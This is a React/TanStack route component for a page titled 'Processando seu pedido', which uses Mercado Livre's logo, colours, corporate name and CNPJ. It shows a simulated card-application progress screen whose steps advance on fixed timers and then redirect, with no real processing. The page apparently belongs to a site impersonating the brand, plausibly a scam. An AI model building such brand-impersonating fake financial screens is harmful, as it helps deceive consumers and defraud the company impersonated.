import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";

export const Route = createFileRoute("/processando")({
  head: () => ({
    meta: [
      { title: "Processando seu pedido - Mercado Livre" },
      { name: "description", content: "Aguarde enquanto processamos a solicitação do seu cartão." },
    ],
  }),
  component: Processando,
});

const steps = [
  "Aguardando resposta",
  "Analisando seu perfil",
  "Preparando seu cartão",
  "Finalizando solicitação",
];

function Processando() {
  const navigate = useNavigate();
  const [current, setCurrent] = useState(0);

  useEffect(() => {
    const timers: ReturnType<typeof setTimeout>[] = [];
    steps.forEach((_, i) => {
      timers.push(setTimeout(() => setCurrent(i + 1), (i + 1) * 1500));
    });
    timers.push(setTimeout(() => navigate({ to: "/" }), steps.length * 1500 + 1200));
    return () => timers.forEach(clearTimeout);
  }, [navigate]);

  return (
    <div className="min-h-screen bg-[#EEEEEE] flex flex-col relative overflow-hidden">
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>

      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#3483FA]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 text-center mb-6">
            Aguarde enquanto processamos seu pedido
          </h1>

          {/* Credit card mockup */}
          <div className="relative w-full aspect-[1.6/1] rounded-2xl bg-gradient-to-br from-[#3483FA] to-[#2968C8] p-5 shadow-xl mb-6 overflow-hidden">
            <div className="absolute inset-0 opacity-20 bg-[radial-gradient(circle_at_top_right,white,transparent_60%)]" />
            <div className="flex justify-between items-start relative">
              <div className="w-12 h-8 bg-[#FFE600] rounded-md flex items-center justify-center">
                <img src={mlLogo} alt="ML" className="h-5 object-contain" />
              </div>
              <span className="text-white/80 text-[10px] tracking-widest font-semibold">PLATINUM</span>
            </div>

            <div className="absolute left-5 top-1/2 -translate-y-1/2">
              <div className="w-10 h-7 rounded-md bg-gradient-to-br from-yellow-300 to-yellow-500" />
            </div>
            <div className="absolute right-5 top-1/2 -translate-y-1/2 text-white text-xl rotate-90">
              ))
            </div>

            <div className="absolute bottom-4 left-5 right-5 flex justify-between items-end">
              <div>
                <div className="text-white font-semibold tracking-wider text-sm">NOME DO TITULAR</div>
                <div className="text-white/70 text-[10px] tracking-wider">TITULAR DO CARTÃO</div>
              </div>
              <div className="flex">
                <div className="w-6 h-6 rounded-full bg-red-500" />
                <div className="w-6 h-6 rounded-full bg-orange-400 -ml-3 mix-blend-multiply" />
              </div>
            </div>
          </div>

          <div className="space-y-4">
            {steps.map((label, i) => {
              const done = i < current;
              const active = i === current;
              return (
                <div key={label} className="flex items-center justify-between border-b border-gray-100 pb-3 last:border-0">
                  <span className={`font-semibold ${done ? "text-gray-800" : active ? "text-gray-800" : "text-gray-500"}`}>
                    {label}
                  </span>
                  {done ? (
                    <span className="w-6 h-6 rounded-full bg-[#00A650] text-white flex items-center justify-center text-xs">
                      ✓
                    </span>
                  ) : active ? (
                    <span className="w-6 h-6 rounded-full border-2 border-[#3483FA] border-t-transparent animate-spin" />
                  ) : (
                    <span className="w-6 h-6 rounded-full border border-gray-300" />
                  )}
                </div>
              );
            })}
          </div>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
          <a href="#" className="text-[#3483FA]">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
